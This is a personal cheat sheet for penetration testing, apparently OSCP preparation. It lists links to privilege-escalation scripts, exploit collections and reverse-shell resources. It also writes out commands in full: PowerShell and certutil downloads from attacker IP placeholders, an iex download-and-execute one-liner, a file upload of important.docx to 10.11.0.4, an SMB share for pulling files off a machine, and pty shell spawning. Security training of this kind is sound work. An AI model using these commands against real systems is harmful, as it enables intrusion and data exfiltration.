# My notes

###### My General Notes.

  This notes contains link of tools, link of cheatsheets, Commands etc.

## Python pip

1. `Python2 -m pip YOUR_COMMAND` OR `pip2 YOUR_COMMAND`

2. `Python3 -m pip YOUR_COMMAND` OR `pip3 YOUR_COMMAND`

## Python3 server

1. Local server in current directory: `python3 -m http.server PORT`

2. Local server in specified directory:

    `python3 -m http.server PORT --directory DIRECTORY`

## Msfvenom CheatSheet

[MSFVenom - CheatSheet - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)

## Peas Family

LinPeas and Winpeas located ate my [`Privesc_scripts`](https://github.com/CalegariMindSec/Privesc_scripts) repository.

[GitHub - carlospolop/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/carlospolop/PEASS-ng)

## Windows PrivEsc Scripts

[`My Privesc Scripts Folder`](https://github.com/CalegariMindSec/Privesc_scripts/tree/main/Windows_Privesc)

[PowerSploit/Privesc at master · PowerShellMafia/PowerSploit · GitHub](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

[GitHub - bitsadmin/wesng: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)

[GitHub - 7Ragnarok7/Windows-Exploit-Suggester-2: A tool to recommend available exploits for Windows Operating Systems](https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2)

[GitHub - r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0)](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

[GhostPack · GitHub](https://github.com/GhostPack)



### Windows PrivEsc Kernel Exploits

[Windows Exploits](https://github.com/abatchy17/WindowsExploits)

[GitHub - SecWiki/windows-kernel-exploits: windows-kernel-exploits Windows平台提权漏洞集合](https://github.com/SecWiki/windows-kernel-exploits)

[exploitdb-bin-sploits/bin-sploits at master · offensive-security/exploitdb-bin-sploits · GitHub](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)

### Windows PrivEsc CheatSheet

[OSCP_Vini2.ctb (sejalivre.org)](https://sejalivre.org/OSCP/index.html#)

[Windows Local Privilege Escalation - HackTricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)

[Notes TCM Course](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)

### Linux PrivEsc Cheatsheet

[Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation)

### OSCP Guide

[GitHub - rkhal101/Hack-the-Box-OSCP-Preparation: Hack-the-Box-OSCP-Preparation](https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation)

### File Download - Windows

1. ```powershell
   certutil.exe -urlcache -f http://IP:PORT/FILE.exe FILE.exe
   ```

2. ```powershell
   powershell -c (new-object System.Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'C:\FULL\PATH\FILE')
   ```

3. ```powershell
   powershell.exe -command iwr -Uri http://IP:PORT/FILE -OutFile "C:\PATH\FILE"
   ```

4. ```powershell
    powershell.exe wget http://IP:PORT/FILE -OutFile FILE
   ```

5. ```powershell
   powershell iex(new-object net.webclient).downloadstring('http://IP:PORT/FILE')
   ```

6. ```powershell
   Start-BitsTransfer -Source https://IP:PORT/FILE -Destination "C:\FULL\PATH\FILE"
   ```
7. ```python3
   impacket-smbserver share . -smb2support (Attacker Machine)
   copy C:\File\To\PATH \\AttackerIP\share\
   ```

### File Upload - Windows

1. ```powershell
   powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
   ```

### File Download - Linux

1. ```bash
   wget http://IP:PORT/FILE
   ```

2. ```bash
   curl http://IP:PORT/FILE -o FILE
   ```

### Python3 tty Shell Spawning

1. ```python
   python -c 'import pty; pty.spawn("/bin/sh")'
   ```

2. ```python
   python3 -c 'import pty; pty.spawn("/bin/sh")'
   ```

### Shell Spawning

[Spawning a TTY Shell (netsec.ws)](https://netsec.ws/?p=337)

### Active Directory Exploitation

[GitHub - S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
[CME cheat sheet](https://wiki.porchetta.industries/)
[Kerberos Attack](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

### Reverse shell

[Reverse Shell Generator](https://www.revshells.com/)
[Reverse shell cheat sheet PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
